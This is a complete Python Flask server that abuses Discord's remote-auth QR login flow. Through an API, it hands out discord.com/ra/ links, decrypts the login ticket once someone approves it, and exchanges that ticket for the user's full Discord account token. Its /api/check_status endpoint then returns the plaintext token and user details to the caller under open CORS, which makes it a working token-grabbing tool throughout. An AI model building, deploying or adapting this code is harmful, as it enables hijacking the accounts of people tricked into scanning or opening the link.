import base64
import json
import threading
import time
import requests
import websocket
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Hash import SHA256
from Crypto.PublicKey import RSA
from flask import Flask, request, jsonify
from flask_cors import CORS
import secrets
import sys
import os
from datetime import datetime, timezone

app = Flask(__name__)
CORS(app)

DEBUG = True

def log(msg):
    timestamp = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] {msg}")
    sys.stdout.flush()

active_sessions = {}
PORT = int(os.environ.get('PORT', 5000))

class Messages:
    HEARTBEAT = 'heartbeat'
    HELLO = 'hello'
    INIT = 'init'
    NONCE_PROOF = 'nonce_proof'
    PENDING_REMOTE_INIT = 'pending_remote_init'
    PENDING_TICKET = 'pending_ticket'
    PENDING_LOGIN = 'pending_login'

class DiscordAuthWebsocket:
    WS_ENDPOINT = 'wss://remote-auth-gateway.discord.gg/?v=2'
    LOGIN_ENDPOINT = 'https://discord.com/api/v9/users/@me/remote-auth/login'

    def __init__(self, session):
        self.session = session
        self.key = RSA.generate(2048)
        self.cipher = PKCS1_OAEP.new(self.key, hashAlgo=SHA256)
        self.heartbeat_interval = None
        self.last_heartbeat = None
        self.current_fingerprint = None
        self.ws = None
        self.should_stop = False

    def run(self):
        log(f"Starting WebSocket for session {self.session.session_id}")
        self.ws = websocket.WebSocketApp(
            self.WS_ENDPOINT,
            on_open=self.on_open,
            on_message=self.on_message,
            on_error=self.on_error,
            on_close=self.on_close,
            header={'Origin': 'https://discord.com'}
        )
        self.ws.run_forever()

    def send(self, op, data=None):
        payload = {'op': op}
        if data:
            payload.update(data)
        if self.ws and self.ws.sock and self.ws.sock.connected:
            self.ws.send(json.dumps(payload))
            log(f"Sent {op}")

    def heartbeat_sender(self):
        while not self.should_stop:
            time.sleep(0.5)
            if self.last_heartbeat and self.heartbeat_interval:
                if time.time() - self.last_heartbeat >= self.heartbeat_interval:
                    self.send(Messages.HEARTBEAT)
                    self.last_heartbeat = time.time()

    def decrypt_payload(self, encrypted_payload):
        payload = base64.b64decode(encrypted_payload)
        return self.cipher.decrypt(payload)

    def on_open(self, ws):
        log("WebSocket opened, sending init")
        self.send(Messages.INIT, {'encoded_public_key': self.public_key})

    def on_message(self, ws, message):
        try:
            data = json.loads(message)
            op = data.get('op')
            log(f"Received op: {op}")

            if op == Messages.HELLO:
                self.heartbeat_interval = data.get('heartbeat_interval') / 1000
                self.last_heartbeat = time.time()
                threading.Thread(target=self.heartbeat_sender, daemon=True).start()

            elif op == Messages.NONCE_PROOF:
                nonce = data.get('encrypted_nonce')
                decrypted = self.decrypt_payload(nonce)
                proof = SHA256.new(decrypted).digest()
                proof = base64.urlsafe_b64encode(proof).decode().rstrip('=')
                self.send(Messages.NONCE_PROOF, {'proof': proof})

            elif op == Messages.PENDING_REMOTE_INIT:
                self.current_fingerprint = data.get('fingerprint')
                log(f"Fingerprint: {self.current_fingerprint}")
                self.session.auth_url = f"https://discord.com/ra/{self.current_fingerprint}"

            elif op == Messages.PENDING_TICKET:
                encrypted_payload = data.get('encrypted_user_payload')
                payload = self.decrypt_payload(encrypted_payload).decode()
                values = payload.split(':')
                self.session.user_data = {
                    'id': values[0],
                    'discriminator': values[1],
                    'avatar': values[2],
                    'username': values[3]
                }
                log(f"Got user: {values[3]}#{values[1]}")

            elif op == Messages.PENDING_LOGIN:
                ticket = data.get('ticket')
                log(f"Got ticket, exchanging for token...")
                try:
                    resp = requests.post(self.LOGIN_ENDPOINT, json={'ticket': ticket}, timeout=10)
                    log(f"Token exchange response: {resp.status_code}")
                    if resp.status_code == 200:
                        encrypted_token = resp.json().get('encrypted_token')
                        token = self.decrypt_payload(encrypted_token).decode()
                        self.session.user_data['token'] = token
                        self.session.completed = True
                        log(f"Token obtained for user {self.session.user_data['username']}")
                        self.should_stop = True
                        ws.close()
                    else:
                        log(f"Token exchange failed: {resp.text}")
                except Exception as e:
                    log(f"Token exchange error: {e}")

        except Exception as e:
            log(f"WebSocket message error: {e}")

    def on_error(self, ws, error):
        log(f"WebSocket error: {error}")

    def on_close(self, ws, status, msg):
        log(f"WebSocket closed: {status} {msg}")

    @property
    def public_key(self):
        pub = self.key.publickey().export_key().decode()
        return ''.join(pub.split('\n')[1:-1])

class AuthSession:
    def __init__(self, session_id):
        self.session_id = session_id
        self.user_data = None
        self.completed = False
        self.created_at = time.time()
        self.auth_url = None
        self.auth_ws = None

    def start(self):
        log(f"Starting session {self.session_id}")
        self.auth_ws = DiscordAuthWebsocket(self)
        thread = threading.Thread(target=self.auth_ws.run, daemon=True)
        thread.start()
        timeout = 10
        while not self.auth_url and timeout > 0:
            time.sleep(0.2)
            timeout -= 0.2
        return self.auth_url

@app.route('/api/create_session', methods=['POST'])
def create_session():
    session_id = secrets.token_urlsafe(16)
    log(f"Create session {session_id}")
    session = AuthSession(session_id)
    active_sessions[session_id] = session
    url = session.start()
    if url:
        log(f"Session {session_id} created: {url}")
        return jsonify({'session_id': session_id, 'auth_url': url, 'status': 'pending'})
    else:
        log(f"Session {session_id} failed to generate URL")
        return jsonify({'error': 'Failed to generate link'}), 500

@app.route('/api/check_status/<session_id>', methods=['GET'])
def check_status(session_id):
    session = active_sessions.get(session_id)
    if not session:
        return jsonify({'error': 'Session not found'}), 404
    if session.completed and session.user_data:
        # Clean up old sessions
        for sid in list(active_sessions.keys()):
            if time.time() - active_sessions[sid].created_at > 300:
                del active_sessions[sid]
        log(f"Session {session_id} completed, returning token")
        return jsonify({'status': 'completed', 'user_data': session.user_data})
    return jsonify({'status': 'pending'})

@app.route('/api/health', methods=['GET'])
def health():
    return jsonify({'status': 'healthy', 'active_sessions': len(active_sessions)})

# For Gunicorn, we don't call app.run()
if __name__ == '__main__':
    log(f"Starting auth server on port {PORT}")
    app.run(host='0.0.0.0', port=PORT, debug=False)
